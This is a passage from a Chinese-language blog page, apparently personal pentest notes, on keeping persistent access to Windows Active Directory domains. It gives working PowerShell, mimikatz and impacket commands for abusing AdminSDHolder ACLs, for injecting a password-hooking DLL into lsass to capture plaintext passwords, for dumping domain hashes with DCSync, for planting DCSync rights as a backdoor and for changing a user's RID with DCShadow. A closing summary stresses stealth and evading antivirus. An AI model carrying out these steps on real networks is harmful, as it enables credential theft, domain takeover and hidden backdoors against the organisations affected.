src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminiSDHolder-user-add.png" alt="AdminiSDHolder-user-add" tabindex="0" loading="lazy"><figcaption>AdminiSDHolder-user-add</figcaption></figure><p>添加好后可以查看一下</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-ObjectAcl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ADSprefix </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;CN=AdminSDHolder,CN=System&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |select IdentityReference</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/adduser.png" alt="adduser" tabindex="0" loading="lazy"><figcaption>adduser</figcaption></figure><p>能够看到hacker用户对AdminSDHolder有了完全控制权限，此时hacker用户虽然没有在域管理组中，但是能够添加指定用户到域管理员组</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/contrpl.png" alt="contrpl" tabindex="0" loading="lazy"><figcaption>contrpl</figcaption></figure><ul><li><p>通过powerview删除AdminSDHolder中指定用户的ACL</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack,DC=com&quot; -PrincipalIdentity hacker -Rights All -Verbose</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul></li></ul></li></ul><h4 id="操控sdprop" tabindex="-1"><a class="header-anchor" href="#操控sdprop"><span>操控SDPROP</span></a></h4><ul><li><p>修改运行频率</p><p>通过注册表修改</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>强制运行</p><ol><li>运行-&gt;<code>LDP.exe</code></li><li>然后选择菜单：<code>连接-&gt;连接</code>，服务器输入你当前的机器名，端口默认为<code>389</code></li><li>然后绑定凭证，选择<code>绑定为当前登录的用户</code>，如果选择<code>与凭据绑定</code>需要输入用户名和密码</li><li>然后<code>浏览-&gt;修改</code>，在<code>属性</code>选项卡中输入<code>FixUpInheritance</code>。在值字段中输入<code>Yes</code>。操作选择<code>添加</code>，然后单击<code>输入</code>，最后运行即可。</li></ol><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/ldp.png" alt="ldp" tabindex="0" loading="lazy"><figcaption>ldp</figcaption></figure></li></ul><h3 id="hook-passwordchangenotify" tabindex="-1"><a class="header-anchor" href="#hook-passwordchangenotify"><span>HOOK PasswordChangeNotify</span></a></h3><p>PasswordChangeNotify在微软的官方文档中称为PsamPasswordNotificationRoutine，是一个API.当用户重置密码时windows会检查新密码是否符合复杂性，符合要求，LSA则调用PasswordChangeNotify函数在系统中同步密码。由于在调用时，用户的账户和密码是通过明文形式进行传输。攻击者可以通过HOOK技术，劫持函数的执行流程，从而获取传入的明文密码。</p><ul><li><p>利用工具</p><p>Hook-PasswordChange.dll</p><p>Invoke-ReflectivePEInjection.ps1</p></li><li><p>具体利用</p><p>1.将工具上传到域控机器，通过Invoke将dll注入到 lsass进程当中</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#导入Invoke-ReflectivePEInjection.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\Invoke-ReflectivePEInjection.ps1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#读取Hook-PasswordChange.dll并将其注入到lsass进程</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$PEBytes</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">IO.File</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::ReadALLBytes(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;C:\\HookPasswordChange.dll&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-ReflectivePEInjection</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PEBytes </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$PEBytes</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ProcName lsass</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>环境有问题，一直缺少了一个动态链接库，干脆换了一个一键式的ps脚本</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">PowerShell.exe</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ExecutionPolicy Bypass </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">File HookPasswordChangeNotify.ps1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>2.当网络管理员修改密码时，新的账户和密码会被保存到C:\\Windows\\Temp下的passwords.txt文件</p><p>也可以通过修改脚本的方式来将修改过的密码传递到远程服务器上</p><p>项目地址：<a href="https://github.com/kevien/PasswordchangeNotify" target="_blank" rel="noopener noreferrer">https://github.com/kevien/PasswordchangeNotify</a></p></li></ul><h2 id="dcsync攻击技术" tabindex="-1"><a class="header-anchor" href="#dcsync攻击技术"><span>DCSync攻击技术</span></a></h2><h3 id="原理" tabindex="-1"><a class="header-anchor" href="#原理"><span>原理</span></a></h3><p>一个域环境可以有多个域控制器，为了防止DC出现意外导致域内瘫痪，所以都是要布置多台域控作为AD域的备份，或者是部署多台域控制器，方便在站点位置本地提供身份验证和其他策略。当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步。<strong>而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC / DCE/RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI</strong>。</p><p>在不同的域控制器之间每15分钟就会同步一次数据，当一个域控想要从另一个域控获取数据时，客户端域控会向服务端域控发送GetNCChanges请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，<strong>通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求</strong>。</p><p>域内用户的权限最根本来自于DACL，对于DCSync来说,只要域用户有以下三条DACL即可向域控发起数据同步请求</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">复制目录更改（DS-Replication-Get-Changes）</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">全部复制目录更改</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (DS-Replication-Get-Changes-All )</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">在过滤集中复制目录更改(可有可无</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)（DS-Replication-Get-Changes-In-Filtered-Set）</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>注意</strong>：对于只读域控制器(RODC)无法使用DCSync进行攻击，因为只读域控制器不能参与数据的同步</p><h3 id="利用dcsync导出域内的hash" tabindex="-1"><a class="header-anchor" href="#利用dcsync导出域内的hash"><span>利用DCSync导出域内的hash</span></a></h3><ul><li><p>mimikatz的利用</p><p>mimikatz自带一个dcsync的利用模块，我们可以利用mimikatz导出域内的hash</p><p>当我们获取到域用户的权限时我们就可以dump域内hash，即使我们没有debug权限，因为DCsync去向域控发起请求并不是本地操作，而是通过网络请求</p><p>执行以下命令dump hash</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#dump指定用户的信息，包括hash值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /user:hack\\Administrator&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#导出域内所有用户的信息，包括hash值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /all&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /all /csv&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dcsync-adminhash.png" alt="dcsync-adminhash" tabindex="0" loading="lazy"><figcaption>dcsync-adminhash</figcaption></figure><p>一般域管用户和krbtgt用户的hash比较有用</p></li><li><p>利用impacket项目中的脚本</p><p>impacket中的srcretsdump.py支持通过DCSync技术导出域控制器中用户的hash.该工具可以使用提供的高权限用户的登陆凭据，从未加入域控制器的系统上远程连接至域控制器，并从注册表中导出本地账户的hash值，同时通过DCSync或卷影复制的方法，NTDS.dit文件中导出所有域用户的hash</p><p>执行以下命令，并提供高权限用户的登陆凭据</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">python secretsdump.py hack.com</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">administratro:</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">UU2FU3O</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ADMIN</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.53.199 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">just</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hack\\Administrator&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/secretsdump.png" alt="secretsdump" tabindex="0" loading="lazy"><figcaption>secretsdump</figcaption></figure><p>即使不在域内，也要跟DC在同一网段才可以dump</p></li></ul><h3 id="利用dcsync进行权限持久化" tabindex="-1"><a class="header-anchor" href="#利用dcsync进行权限持久化"><span>利用DCSync进行权限持久化</span></a></h3><p>通过赋予标准用户DCSync的操作权限，从而制造隐蔽的后门，用户只需要前文提到的两条额外扩展权限即可控制DCSync</p><ul><li><p>通过powervive写入DCSync</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-ExecutionPolicy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Bypass </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Scope </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Process</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\powerview.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Add-DomainObjectAcl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">TargetIdentity </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DC=hack,DC=com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PrincipalIdentity hacker </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Rights DCSync </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Verbose</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><p>给hacker用户添加权限后，就可以通过hacker用户的凭据在远程主机上导出域内用户的hash值了(<a href="http://xn--scretsdump-ym34ap2a.py" target="_blank" rel="noopener noreferrer">通过scretsdump.py</a>)</p><h3 id="dcshadow" tabindex="-1"><a class="header-anchor" href="#dcshadow"><span>DCShadow</span></a></h3><p><a href="https://www.anquanke.com/post/id/96704" target="_blank" rel="noopener noreferrer">https://www.anquanke.com/post/id/96704</a></p><p><a href="https://www.dcshadow.com/" target="_blank" rel="noopener noreferrer">https://www.dcshadow.com/</a></p><p>DCShadow技术通过注册一个新的域控制器，利用数据复制的方法，将准备好的恶意对象注入合法的域控制器，以此来创建域后门</p><ul><li><p>利用mimikatz修改用户的RID</p><p>通过修改用户的RID，将用户添加进特权组</p><p>1.mimikatz执行以下命令</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcshadow /object:CN=hacker,CN=Users,DC=hack,DC=com /attribute:primaryGroupID /value:512&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>2.开启一个新的窗口，通过mimikatz强行触发域复制,将数据推送到合法的域控制器</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcshadow /push&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcshadow.png" alt="dcshadow" tabindex="0" loading="lazy"><figcaption>dcshadow</figcaption></figure></li></ul><p>推送后就能看到hacker用户的RID已经被修改为512</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hacker-RID.png" alt="hacker-RID" tabindex="0" loading="lazy"><figcaption>hacker-RID</figcaption></figure><p>此外DCShadow还可以用于SID History的修改等来进行权限持久化 ，可在hacktricks上查看</p><p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow</a></p><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结：</span></a></h2><p>大概了解了一部分内网权限持久化的知识，但都比较基础</p><ul><li><p>常见后门：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>影子账户，不在用户中的用户</span></span>
<span class="line"><span>系统服务后门，通过系统服务的自启动</span></span>
<span class="line"><span>计划任务后门，与系统服务相似，在固定时间执行</span></span>
<span class="line"><span>启动项\\注册表键后门，通过系统或特定用户登陆时触发的后门</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>事件触发类的</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>WMI订阅事件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>屏幕保护程序，手动设置屏幕保护启动程序</span></span>
<span class="line"><span></span></span>
<span class="line"><span>DLL劫持，通过恶意的DLL文件创建后门</span></span>
<span class="line"><span></span></span>
<span class="line"><span>辅助功能劫持,最常见的shift粘滞键</span></span>
<span class="line"><span></span></span>
<span class="line"><span>IFEO镜像劫持，修改注册表debugger字段</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>上述方法大部分针对于对一台机器的权限维持，并不涉及域，而且，大部分通过恶意程序直接返回会话。</strong></p></li><li><p>域相关</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Skeleton Key万能钥匙，在内存中注入一个统一的域用户密码认证(通过lsass进程)，域控重启需要重新部署</span></span>
<span class="line"><span></span></span>
<span class="line"><span>DSRM后门，通过修改注册表，使DSRM用户能够在任意时间登录与控制器，PTH即可获得持续的权限</span></span>
<span class="line"><span></span></span>
<span class="line"><span>SID history，将域管用户的SID注入到普通用户的SID History当中，使普通用户拥有域管权限</span></span>
<span class="line"><span></span></span>
<span class="line"><span>AdminSDHolder,操作AdminSDHolder的ACL普通用户对AdminSDHolder有完全控制权限，利用SDPROP来将该ACL同步到受保护的ACL</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Hook PasswordChangeNotify,用户更改密码时，会将密码保存在盘中，可通过脚本将修改后的密码发送到远程服务器</span></span>
<span class="line"><span></span></span>
<span class="line"><span>DCSync,利用AD复制的原理，导出hash或是赋予标准用户DCSync的权限，使得标准用户能够远程导出hash，DCshadow技术对SID History和RID的操作</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><p><strong>与域有关的方法，侧重于对于域控机器的权限持久化，但都需要域管的权限，并且大部分要求有同一网段的主机能够进行通信 (即使是DCSync不要求你的机器在域中，但是也要能够进行通信)</strong></p><ul><li><p>从整体上来思考</p><p>对于内网权限持久化来讲最重要的就是持久了(废话)，要持久就需要较高的隐蔽性，避免被发然后清除。如果可以，一定是希望所用的后门能够静默，例如域方法中的DCShadow就只有少量的日志，需要特定的监控方法。</p></li><li><p>从个体上来看</p><p>要能够在个体上建立持久化的后门，才能够保持与域控的通信，从而控制域控，即使能够在域控上保持权限，没有能够与之通信的机器也是没用的。所以，要求我们上传的后门程序足够隐蔽，在我看来，最好是把上传的文程序加入到白名单，避免被杀。同时还需要对杀软有一定的免疫性。</p></li></ul>`,171)]))}const k=s(t,[["render",h],["__file","内网权限持久化.html.vue"]]),o=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96.html","title":"内网权限持久化","lang":"zh-CN","frontmatter":{"description":"内网权限持久化 辅助功能镜像劫持 shift后门 利用windows的辅助功能进行后门 最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序 在windows的古早版本中，我们可以使用copy命令来使用cmd命令覆盖sethc.exe文件(我理解的后门是将这里更换为自己免杀过的木马文...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"内网权限持久化"}],["meta",{"property":"og:description","content":"内网权限持久化 辅助功能镜像劫持 shift后门 利用windows的辅助功能进行后门 最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序 在windows的古早版本中，我们可以使用copy命令来使用cmd命令覆盖sethc.exe文件(我理解的后门是将这里更换为自己免杀过的木马文..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_faild.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"内网权限持久化\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_faild.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_win.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/shift_try.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shift-rdp-hijiacking.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/debugger_by_hand.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/werfaylt-cmd.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/reg-F-tihuan.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Psexec-stream/looklook-user.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/shadow-user.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/remote-user-add.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/svchost-rpc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/svchost-parameters.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regedic_svchsot.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/apptaskapprun.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/regadd-hkey-backdoor.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/winlogon.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/test-monitor.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/sharp-wmievent.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/scenn.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/notepad%2B%2B.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/aheadlib.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/oci-dll.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/skeleton-key.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/lsabypass-mimikatz.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-pwd-reset.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/mimikatz-dsrm-hash-dump.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-model2.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-hash-login.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminSDHistory.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminiSDHolder-user-add.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/adduser.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/contrpl.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/ldp.png\\",\\"https://raw.githubu